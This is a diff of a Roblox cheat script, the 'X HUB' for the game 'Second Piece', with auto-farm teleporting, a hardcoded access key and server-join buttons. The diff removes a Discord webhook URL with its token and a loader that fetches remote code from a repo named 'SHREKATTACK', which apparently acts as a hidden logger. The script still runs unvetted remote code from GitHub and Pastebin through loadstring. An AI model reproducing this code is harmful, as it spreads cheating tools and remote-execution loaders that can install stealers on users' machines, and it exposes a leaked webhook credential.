@@ -1,13 +1,12 @@
+
+
 spawn(function()
- if Configs["Key"] == "XHUB-QVXZYH-WRRYY-TTRQZ" then
+ if Configs["Key"] == "X-VPZWTH-WUTQXBZWRQW" then
  if game.PlaceId == 15049111150 then
 game.StarterGui:SetCore("SendNotification",{
             Title = "Second Piece✅";
             Text = "Loading Script...";
 })
-wait()
-_G.webhooksdiscord = "https://discord.com/api/webhooks/1195665922707423362/4t5jn9cYiLuK6VH_XCtwd7kY4rxHeCrPKbPIzbgwYnHawO7bsqHzUdQPP-dwxFU6NjqD"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
 if game.CoreGui:FindFirstChild("ThunderScreen") then
     game.CoreGui:FindFirstChild("ThunderScreen"):Destroy()
     game.CoreGui:FindFirstChild("Library"):Destroy()
@@ -49,12 +48,8 @@ local ThunderImageUI = Instance.new("ImageLabel")
         ThunderImageUI.Size = UDim2.new(0, 50, 0, 50)
         ThunderImageUI.Image = "http://www.roblox.com/asset/?id=15909395058"
 
-local VLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/boss093/Testui/main/Uiuse"))()
-
-
-		MAINTTL = "X HUB" 
-
-local win = VLib:Window("Second Piece[FREE😁]", Color3.fromRGB(196, 40, 28))
+local VLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vep1032/VepStuff/main/VL"))()
+local win = VLib:Window("X HUB", "Second Piece[FREE]", "X")
 
 local a1 = win:Tab("Credits")
 local a2 = win:Tab("Farm")
@@ -232,7 +227,7 @@ game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.
 end)
 end) 
 
- a2:Slider("Distance",1,10,4,function(t)
+ a2:Slider("Distance",0,10,4,function(t)
  distance = t     
  end)
  
@@ -747,6 +742,19 @@ loadstring(game:HttpGet("https://pastebin.com/raw/y5reZYnG", true))()
 end)
 
 a7:Label("📜Server📜")
+
+a7:Textbox("Place Job Id", true,function(t)
+  _G.Job = t
+end)
+
+a7:Button("Copy Job Id",function()
+  setclipboard(tostring(game.JobId))
+end)
+
+a7:Button("Join Sever",function()
+  game:GetService("TeleportService"):TeleportToPlaceInstance(game.placeId,_G.Job, game.Players.LocalPlayer)
+end)
+
 
 a7:Button("Rejoin",function()
 local ts = game:GetService("TeleportService")
